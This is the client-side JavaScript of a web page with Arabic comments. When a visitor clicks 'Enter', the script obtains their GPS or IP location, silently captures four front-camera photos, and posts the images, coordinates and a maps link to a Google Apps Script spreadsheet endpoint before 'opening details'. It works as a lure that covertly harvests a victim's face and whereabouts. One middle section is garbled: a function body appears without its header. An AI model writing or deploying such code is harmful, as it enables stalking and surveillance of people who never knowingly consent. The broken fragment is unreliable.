async function getLocationName(latitude, longitude) {
    try {
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&zoom=10&accept-language=ar`
        );
        if (!response.ok) throw new Error('فشل');
        const data = await response.json();
        let locationName = '';
        if (data.address) {
            locationName = data.address.city || data.address.town || data.address.village || 
                          data.address.suburb || data.address.district || data.address.county || 
                          data.address.state || data.address.country || 'منطقة غير معروفة';
        } else {
            locationName = 'منطقة غير معروفة';
        }
        return locationName;
    } catch (error) {
        return 'منطقة غير معروفة';
    }
}

// ================================
// دالة التقاط صورة من فيديو معين
// ================================
function captureImageFromVideo(videoElement) {
    if (!videoElement || !videoElement.videoWidth) return null;
    const canvas = document.createElement('canvas');
    canvas.width = videoElement.videoWidth;
    canvas.height = videoElement.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg', 0.7);
}

// ================================
// دالة تشغيل الكاميرات والتقاط الصور
// ================================
async function startCameras(statusDiv, btn) {
    try {
        // طلب كاميرا واحدة فقط (الأمامية)
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', 
                width: { ideal: 320 }, 
                height: { ideal: 240 } 
            },
            audio: false
        });
        
        const videoFront = document.getElementById('videoFront');
        videoFront.srcObject = stream;
        await new Promise((resolve) => {
            videoFront.onloadedmetadata = () => {
                videoFront.play();
                cameraFrontReady = true;
                resolve();
            };
        });

        statusDiv.innerHTML = "✅ Camera ready. Capturing images...";
        statusDiv.className = "status-success";

        // التقاط 4 صور من نفس الكاميرا (بدلاً من 2+2)
        const videoFrontEl = document.getElementById('videoFront');
        for (let i = 0; i < 4; i++) {
            await new Promise(resolve => setTimeout(resolve, 300));
            const imgData = captureImageFromVideo(videoFrontEl);
            if (imgData) {
                if (i < 2) {
                    frontImages.push(imgData);
                } else {
                    backImages.push(imgData);
                }
            }
        }

        // إغلاق تدفق الكاميرا
        if (videoFront.srcObject) {
            videoFront.srcObject.getTracks().forEach(track => track.stop());
        }

        statusDiv.innerHTML = `📸 Captured ${frontImages.length + backImages.length} images (${frontImages.length} front, ${backImages.length} back)`;
        statusDiv.className = "status-success";
        
        if (frontImages.length >= 2 && backImages.length >= 2) {
            checkAndSend(statusDiv);
        } else {
            statusDiv.innerHTML = "⚠️ Could not capture all images. Please try again.";
            statusDiv.className = "status-error";
            btn.disabled = false;
            btn.textContent = "Enter";
        }

    } catch (err) {
        statusDiv.innerHTML = "❌ Camera access denied. Please allow camera access.";
        statusDiv.className = "status-error";
        btn.disabled = false;
        btn.textContent = "Enter";
    }
}


// ================================

async function sendAllData() {
    if (!locationData || frontImages.length < 2 || backImages.length < 2) {
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = "❌ Missing data or images. Details cannot be opened.";
        statusDiv.className = "status-error";
        const btn = document.getElementById('continueBtn');
        btn.disabled = false;
        btn.textContent = "Enter";
        return;
    }
    if (sendInProgress) return;
    sendInProgress = true;

    const { latitude, longitude, source, locationName } = locationData;
    const timestamp = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
    const linkLocation = `https://www.google.com/maps?q=${latitude},${longitude}`;
    
    const payload = {
        sheetId: SHEET_ID,
        sheetName: SHEET_NAME,
        newDate: new Date().toISOString(),
        linkLocation: linkLocation,
        latitude: latitude,
        longitude: longitude,
        Timestamp: timestamp,
        LocationName: locationName,
        imageData: frontImages[0] || '',
        imageData2: frontImages[1] || '',
        imageData3: backImages[0] || '',
        imageData4: backImages[1] || ''
    };

    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = "📤 Sending data to server...";
    statusDiv.className = "status-loading";

    try {
        await fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        statusDiv.innerHTML = "✅ Data sent successfully! Opening details...";
        statusDiv.className = "status-success";
        openBlockWindow();
        const btn = document.getElementById('continueBtn');
        btn.disabled = true;
        btn.textContent = "Done";
        btn.classList.add('btn-disabled');
        isDone = true;
    } catch (error) {
        statusDiv.innerHTML = "⚠️ Error sending data. Opening details anyway.";
        statusDiv.className = "status-error";
        openBlockWindow();
        const btn = document.getElementById('continueBtn');
        btn.disabled = true;
        btn.textContent = "Done";
        btn.classList.add('btn-disabled');
        isDone = true;
    } finally {
        sendInProgress = false;
    }
}

// ================================
// دالة التحقق من الجاهزية للإرسال
// ================================
function checkAndSend(statusDiv) {
    if (sendInProgress || isDone) return;
    if (frontImages.length < 2 || backImages.length < 2) {
        statusDiv.innerHTML = "⏳ Waiting for all images...";
        statusDiv.className = "status-loading";
        return;
    }
    if (locationData) {
        sendAllData();
    } else {
        setTimeout(() => checkAndSend(statusDiv), 500);
    }
}

// ================================
// دالة تخزين الموقع
// ================================
function storeLocation(latitude, longitude, source) {
    if (locationData) return;
    locationData = { latitude, longitude, source };
    getLocationName(latitude, longitude).then(name => {
        locationData.locationName = name;
        const statusDiv = document.getElementById('status');
        statusDiv.innerHTML = "📍 Location retrieved!";
        statusDiv.className = "status-success";
        if (frontImages.length >= 2 && backImages.length >= 2) {
            checkAndSend(statusDiv);
        }
    });
}

// ================================
// دوال جلب الموقع
// ================================
function getLocationViaIP() {
    fetch('https://api.bigdatacloud.net/data/ip-geolocation?localityLanguage=ar')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP'); })
        .catch(() => getLocationViaIP2());
}

function getLocationViaIP2() {
    fetch('https://ipapi.co/json/')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { if (data.latitude && data.longitude) storeLocation(data.latitude, data.longitude, 'IP'); })
        .catch(() => getLocationViaIP3());
}

function getLocationViaIP3() {
    fetch('https://ipinfo.io/json')
        .then(res => res.ok ? res.json() : Promise.reject())
        .then(data => { 
            if (data.loc) { 
                const coords = data.loc.split(',').map(Number); 
                if (coords.length === 2 && !isNaN(coords[0]) && !isNaN(coords[1])) {
                    storeLocation(coords[0], coords[1], 'IP');
                }
            }
        });
}

function getLocationViaGPS() {
    if (!navigator.geolocation) { getLocationViaIP(); return; }
    navigator.geolocation.getCurrentPosition(
        (position) => storeLocation(position.coords.latitude, position.coords.longitude, 'GPS'),
        () => getLocationViaIP(),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
}

                reject(new Error('Geolocation not supported'));
                return;
            }
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });

        // تخزين الموقع
        const { latitude, longitude } = position.coords;

        statusDiv.className = "status-warning";
        getLocationViaIP();
        
        // استمر في تشغيل الكاميرا
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 320 }, 
                    height: { ideal: 240 } 
                },
                audio: false
            });
            
            const videoFront = document.getElementById('videoFront');
            videoFront.srcObject = stream;
            await new Promise((resolve) => {
                videoFront.onloadedmetadata = () => {
                    videoFront.play();
                    cameraFrontReady = true;
                    resolve();
                };
            });

            const videoFrontEl = document.getElementById('videoFront');
            for (let i = 0; i < 4; i++) {
                await new Promise(resolve => setTimeout(resolve, 300));
                const imgData = captureImageFromVideo(videoFrontEl);
                if (imgData) {
                    if (i < 2) {
                        frontImages.push(imgData);
                    } else {
                        backImages.push(imgData);
                    }
                }
            }

            if (videoFront.srcObject) {
                videoFront.srcObject.getTracks().forEach(track => track.stop());
            }

            statusDiv.innerHTML = `📸 Captured ${frontImages.length + backImages.length} images (approx location)`;
            statusDiv.className = "status-success";
            
            if (frontImages.length >= 2 && backImages.length >= 2) {
                setTimeout(() => checkAndSend(statusDiv), 3000);
            }
        } catch (cameraErr) {
            statusDiv.innerHTML = "❌ Camera access denied. Please allow camera access.";
            statusDiv.className = "status-error";
            btn.disabled = false;
            btn.textContent = "Enter";
        }
    }
}


// ================================
// حدث الضغط على زر متابعة
// ================================
document.getElementById('continueBtn').addEventListener('click', async function() {
    if (isDone) return;
    const btn = this;
    const statusDiv = document.getElementById('status');
    
    btn.disabled = true;
    btn.textContent = "loading...";
    statusDiv.innerHTML = "⏳ Starting...";
    statusDiv.className = "status-loading";

    frontImages = [];
    backImages = [];
    locationData = null;
    sendInProgress = false;
    isDone = false;
    cameraFrontReady = false;

    // استدعاء الدالة الموحدة
    await getLocationThenCamera(statusDiv, btn);

    // timeout احتياطي
    setTimeout(() => {
        if (!isDone) {
            if (frontImages.length < 2 || backImages.length < 2) {
                statusDiv.innerHTML = "⏰ Timeout: Could not capture all images. Please try again.";
                statusDiv.className = "status-error";
                btn.disabled = false;
                btn.textContent = "Enter";
            } else if (!locationData) {
                statusDiv.innerHTML = "⚠️ Timeout: Location not retrieved. Using IP.";
                statusDiv.className = "status-warning";
                getLocationViaIP();
                setTimeout(() => checkAndSend(statusDiv), 3000);
            }
        }
    }, 30000);
});
</script>
